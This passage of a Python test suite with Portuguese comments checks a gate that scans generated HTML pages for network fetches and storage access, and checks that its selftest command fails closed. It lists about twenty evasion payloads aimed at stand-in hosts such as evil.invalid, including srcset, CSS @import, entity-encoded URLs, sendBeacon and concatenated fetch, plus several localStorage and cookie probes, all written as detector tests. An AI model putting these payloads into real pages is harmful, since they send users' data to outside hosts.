    # o detector. A r1 caiu exatamente aqui: o gate reconhecia sete strings e as cinco
    # evasões do mandato passavam — `srcset` externo saiu com exit 0 e a suíte verde.
    VENENOS_DE_REDE = (
        ("link externo", '<link rel="stylesheet" href="https://cdn.invalido/x.css">'),
        ("src com aspas simples", "<img src='https://evil.invalid/p.png'>"),
        ("srcset", '<img srcset="https://evil.invalid/vazamento.png 1x" alt="">'),
        ("url() no CSS", "<style>body{background:url(https://evil.invalid/bg.png)}</style>"),
        ("meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.invalid/">'),
        ("import dinâmico", '<script>import("https://evil.invalid/m.js")</script>'),
        ("fetch concatenado", '<script>window["fe"+"tch"]("https://evil.invalid/")</script>'),
        ("sendBeacon", '<script>navigator.sendBeacon("/sonda", "x")</script>'),
        ("iframe externo", '<iframe src="https://evil.invalid/"></iframe>'),
        ("formulário externo", '<form action="https://evil.invalid/coleta"></form>'),
        # confirmados por reprodução independente na Task 12
        ("@import com url()", '<style>@import url("https://evil.invalid/x.css");</style>'),
        # r2: o teste anterior chamado "@import" provava o ramo url(), não o @import
        ("@import textual", '<style>@import "https://evil.invalid/r2.css";</style>'),
        ("@import sem aspas", "<style>@import url(https://evil.invalid/r2b.css);</style>"),
        ("url() em atributo style",
         '<div style="background:url(https://evil.invalid/bg.png)">x</div>'),
        ("@font-face externo",
         '<style>@font-face{font-family:x;src:url("https://evil.invalid/f.woff2")}</style>'),
        ("svg image href", '<svg><image href="https://evil.invalid/i.png"/></svg>'),
        ("base href", '<base href="https://evil.invalid/">'),
        ("endereço em pedaços",
         '<script>var u = "https:" + "//evil.invalid/" + "coleta";</script>'),
        # r3: entidades HTML no VALOR de atributo — o navegador as decodifica antes de
        # buscar, então a URL externa fica escondida do gate que lê o HTML cru
        ("entidade decimal em src",
         '<img src="&#104;&#116;&#116;&#112;&#115;://cdn.mal/x.png">'),
        ("entidade hexadecimal em href",
         '<a href="&#x68;&#x74;&#x74;&#x70;&#x73;://cdn.mal/y">z</a>'),
        ("entidade nomeada com // em srcset",
         '<img srcset="https&colon;&sol;&sol;cdn.mal/z.png 1x">'),
    )

    # A mesma entidade DENTRO de <style> NÃO é executável: o parser de CSS não decodifica
    # entidades HTML, então nada é buscado. Decodificar aqui seria inventar um problema.
    ENTIDADE_EM_STYLE = '<style>@import "&#104;ttps://cdn.mal/x.css";</style>'

    VENENOS_DE_ARMAZENAMENTO = (
        ("sessionStorage", '<script>sessionStorage.setItem("qualquer", "1")</script>'),
        # r2: a regra declarada era "só a forma canônica passa"; estas escapavam
        ("alias de localStorage",
         '<script>const ls = localStorage; ls.setItem("sem-namespace", "1")</script>'),
        ("indexedDB", '<script>indexedDB.open("outra-gaveta")</script>'),
        ("document.cookie", '<script>document.cookie = "x=1"</script>'),
        ("clear()", "<script>localStorage.clear()</script>"),
        ("caches", '<script>caches.open("v1")</script>'),
        ("aspas simples", "<script>localStorage.setItem('sem-namespace', '1')</script>"),
        ("acesso por colchetes", '<script>window["localStorage"].setItem("x", "1")</script>'),
        ("desestruturação", "<script>var {setItem} = localStorage;</script>"),
        ("chave literal", '<script>localStorage.setItem("outra-coisa", "1")</script>'),
    )

    def test_toda_evasao_de_rede_e_denunciada(self):
        for rotulo, veneno in self.VENENOS_DE_REDE:
            for nome, pagina in (("direções", render_direcoes(self.direcoes)),
                                 ("grill", render_grill(self.grill))):
                sabotada = pagina.replace("</body>", veneno + "</body>", 1)
                self.assertNotEqual(problemas_de_rede(sabotada, nome), [],
                                    f"{nome}: passou batido — {rotulo}: {veneno}")

    def test_toda_evasao_de_armazenamento_e_denunciada(self):
        for rotulo, veneno in self.VENENOS_DE_ARMAZENAMENTO:
            for nome, pagina in (("direções", render_direcoes(self.direcoes)),
                                 ("grill", render_grill(self.grill))):
                sabotada = pagina.replace("</body>", veneno + "</body>", 1)
                self.assertNotEqual(problemas_de_armazenamento(sabotada, nome), [],
                                    f"{nome}: passou batido — {rotulo}: {veneno}")

    def test_entidade_html_em_style_nao_e_falso_positivo(self):
        """Entidade em CSS não busca nada — o gate não pode inventar problema onde não há."""
        for nome, pagina in (("direções", render_direcoes(self.direcoes)),
                             ("grill", render_grill(self.grill))):
            sabotada = pagina.replace("</body>", self.ENTIDADE_EM_STYLE + "</body>", 1)
            self.assertEqual(problemas_de_rede(sabotada, nome), [],
                             f"{nome}: acusou entidade em <style>, que não é executável")

    def test_a_bateria_de_rede_cobre_os_vetores_esperados(self):
        """A contagem é afirmada: some um vetor da lista e o teste avisa (lição da T8)."""
        rotulos = [r for r, _ in self.VENENOS_DE_REDE]
        self.assertEqual(len(rotulos), len(set(rotulos)), "vetor de rede duplicado")
        for obrigatorio in ("entidade decimal em src", "entidade hexadecimal em href",
                            "@import textual", "srcset", "base href"):
            self.assertIn(obrigatorio, rotulos, f"a bateria perdeu o vetor {obrigatorio!r}")
        self.assertGreaterEqual(len(rotulos), 20, "a bateria de rede encolheu")

    def test_sabotagem_de_rede_derruba_o_comando_inteiro(self):
        """Ponta a ponta: não basta a função acusar, o autoteste tem de reprovar."""
        veneno = '<img srcset="https://evil.invalid/vazamento.png 1x" alt="">'
        original = render_direcoes

        def sabotado(contrato):
            return original(contrato).replace("</body>", veneno + "</body>", 1)

        with mock.patch(f"{__name__}.render_direcoes", side_effect=sabotado):
            problemas = checagens_estaticas()
        self.assertNotEqual(problemas, [], "a sabotagem chegaria ao usuário com exit 0")

    def test_chave_de_armazenamento_sem_namespace_e_denunciada(self):
        pagina = render_direcoes(self.direcoes)
        self.assertEqual(problemas_de_armazenamento(pagina, "sonda"), [])
        sujo = pagina.replace("temcomo:", "", 1)
        self.assertNotEqual(problemas_de_armazenamento(sujo, "sonda"), [])

    def test_recado_do_gate_de_rede_e_leigo(self):
        sabotada = render_direcoes(self.direcoes).replace(
            "</body>", '<script>navigator.sendBeacon("/x", "y")</script></body>', 1)
        problemas = problemas_de_rede(sabotada, "sonda")
        self.assertTrue(problemas)
        primeira = problemas[0].split("\n")[0]
        self.assertNotIn("sendBeacon", primeira,
                         "o nome da API JavaScript vazou para a linha que o usuário lê")
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(primeira))), [],
                         primeira)
        self.assertIn(ROTULO_RASTRO, problemas[0],
                      "o identificador técnico precisa vir sob rótulo (decisão 15)")

    def test_contrato_embutido_diferente_do_de_entrada_e_denunciado(self):
        pagina = render_direcoes(self.direcoes)
        self.assertEqual(problemas_do_contrato_embutido(pagina, self.direcoes, "sonda"), [])
        outro = json.loads(json.dumps(self.direcoes))
        outro["direcoes"][0]["nome"] = "nome que a página não mostra"
        self.assertNotEqual(problemas_do_contrato_embutido(pagina, outro, "sonda"), [])

    def test_jargao_interno_no_titulo_e_denunciado(self):
        pagina = render_grill(self.grill)
        self.assertEqual(problemas_de_jargao(pagina, "sonda"), [])
        for jargao in ("grill", "JSON", "schema"):
            sujo = re.sub(r"<h1[^>]*>.*?</h1>", f"<h1>Rodada de {jargao}</h1>", pagina,
                          count=1, flags=re.S)
            self.assertNotEqual(problemas_de_jargao(sujo, "sonda"), [],
                                f"jargão passou no título: {jargao}")


class TestAutotesteFailClosed(unittest.TestCase):
    """O veredito do autoteste segue o unittest — nenhum verde falso."""

    @staticmethod
    def _rodar(classe):
        suite = unittest.defaultTestLoader.loadTestsFromTestCase(classe)
        return unittest.TextTestRunner(stream=io.StringIO(), verbosity=0).run(suite)

    def test_sucesso_inesperado_reprova(self):
        # classe local: não é descoberta pela suíte real (loadTestsFromModule só vê o módulo)
        class SuiteLocal(unittest.TestCase):
            @unittest.expectedFailure
            def test_passa_mas_deveria_falhar(self):
                self.assertTrue(True)
        res = self._rodar(SuiteLocal)
        self.assertFalse(res.wasSuccessful())          # o unittest reprova
        self.assertEqual(len(res.unexpectedSuccesses), 1)
        self.assertEqual(res.failures, []); self.assertEqual(res.errors, [])
        codigo, resumo, problemas = diagnostico_da_suite(res)
        self.assertEqual(codigo, 1, "verde falso: sucesso inesperado passou batido")
        self.assertIn("AUTOTESTE FALHOU", resumo)
        self.assertEqual(len(problemas), 1)

    def test_falha_comum_reprova(self):
        class SuiteLocal(unittest.TestCase):
            def test_quebra(self):
                self.assertTrue(False, "falha de propósito")
        codigo, resumo, problemas = diagnostico_da_suite(self._rodar(SuiteLocal))
        self.assertEqual(codigo, 1)
        self.assertIn("AUTOTESTE FALHOU", resumo)
        self.assertEqual(len(problemas), 1)

    def _roda_autoteste(self):
        saida, erro = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(saida), contextlib.redirect_stderr(erro), \
             self.assertRaises(SystemExit) as ctx:
            cmd_autoteste(None)
        return ctx.exception.code, saida.getvalue() + erro.getvalue()

    def test_gate_estatico_reprova_o_comando_mesmo_com_a_suite_verde(self):
        """Suíte verde não basta: se a página passar a buscar coisa na rede, o comando cai."""
        with mock.patch(f"{__name__}.unittest.defaultTestLoader.loadTestsFromModule",
                        return_value=unittest.TestSuite()), \
             mock.patch(f"{__name__}.checagens_estaticas",
                        return_value=["direcoes.json: a página busca 'https://x' na rede"]):
            codigo, texto = self._roda_autoteste()
        self.assertEqual(codigo, 1)
        self.assertIn("conferência das páginas geradas", texto)
        self.assertIn("busca 'https://x' na rede", texto)
        self.assertIn("fora da suíte", texto)

    def test_gate_fail_closed_reprova_o_comando(self):
        with mock.patch(f"{__name__}.unittest.defaultTestLoader.loadTestsFromModule",
                        return_value=unittest.TestSuite()), \
             mock.patch(f"{__name__}.provas_fail_closed",
                        return_value=["'objetivo.json' foi aceito sem campo obrigatório"]):
            codigo, texto = self._roda_autoteste()
        self.assertEqual(codigo, 1)
        self.assertIn("prova de que a validação recusa", texto)

    def test_gate_que_quebra_nao_vira_gate_ausente(self):
        """Exceção dentro do gate reprova; engolir viraria aprovação silenciosa."""
        with mock.patch(f"{__name__}.unittest.defaultTestLoader.loadTestsFromModule",
                        return_value=unittest.TestSuite()), \
             mock.patch(f"{__name__}.checagens_estaticas",
                        side_effect=RuntimeError("o gate explodiu")):
            codigo, texto = self._roda_autoteste()
        self.assertEqual(codigo, 1)
        self.assertIn("não chegou ao fim", texto)
        self.assertNotIn("Traceback", texto)

    def test_suite_limpa_aprova(self):
        class SuiteLocal(unittest.TestCase):
            def test_ok(self):
                self.assertTrue(True)
        codigo, resumo, problemas = diagnostico_da_suite(self._rodar(SuiteLocal))
        self.assertEqual(codigo, 0)
        self.assertEqual(resumo, "AUTOTESTE OK — 1 testes")
        self.assertEqual(problemas, [])

    def test_rotulo_ptbr_antes_do_rastro(self):
        # decisão 15: o rastro fica no formato original do Python,
        # sempre precedido da linha-rótulo em PT-BR.
        class SuiteLocal(unittest.TestCase):
            def test_quebra(self):
                self.assertEqual([1], [2])
        _, _, problemas = diagnostico_da_suite(self._rodar(SuiteLocal))
        self.assertEqual(len(problemas), 1)
        detalhe = problemas[0][1]
        self.assertTrue(detalhe.startswith(ROTULO_RASTRO), detalhe[:120])
        self.assertIn("Lists differ", detalhe)   # prosa da stdlib preservada, por decisão

    def test_motivo_proprio_nao_leva_rotulo_de_rastro(self):
        class SuiteLocal(unittest.TestCase):
            @unittest.expectedFailure
            def test_passa_mas_deveria_falhar(self):
                self.assertTrue(True)
        _, _, problemas = diagnostico_da_suite(self._rodar(SuiteLocal))
        self.assertNotIn(ROTULO_RASTRO, problemas[0][1])   # texto nosso, já em PT-BR
        self.assertEqual(achar_ingles(problemas[0][1]), [])

    def test_traceback_traduzido_preserva_diagnostico(self):
        bruto = ('Traceback (most recent call last):\n'
                 '  File "/x/engine/temcomo.py", line 42, in test_algo\n'
                 '    self.assertTrue(False)\n'
                 'AssertionError: falhou\n')
        traduzido = traduzir_traceback(bruto)
        self.assertIn("Rastro da falha", traduzido)
        self.assertIn('Arquivo "/x/engine/temcomo.py", linha 42, em test_algo', traduzido)
        self.assertNotIn("Traceback", traduzido)
        self.assertNotIn("File \"", traduzido)
        self.assertIn("self.assertTrue(False)", traduzido)   # código intacto
        self.assertIn("AssertionError: falhou", traduzido)   # nome da exceção intacto

def main(argv=None):
    argv = sys.argv[1:] if argv is None else argv
    if argv[:1] == ["ajuda"]:  # só como primeiro token; depois disso é dado do usuário.
        print(USO)             # As flags (-h/--help/--ajuda) ficam com o parser, que
        raise SystemExit(0)    # respeita o separador "--" e a ordem dos subcomandos.
    args = construir_parser().parse_args(argv)
    try:
        args.func(args)
    except OSError as e:
        # Última barreira: nenhuma porta nova pode voltar a mostrar rastro cru do
        # sistema, mesmo que esqueça de traduzir por dentro (achado r3/2).
        fail(f"não consegui completar o comando — {motivo_do_sistema(e)}")

if __name__ == "__main__":
    main()
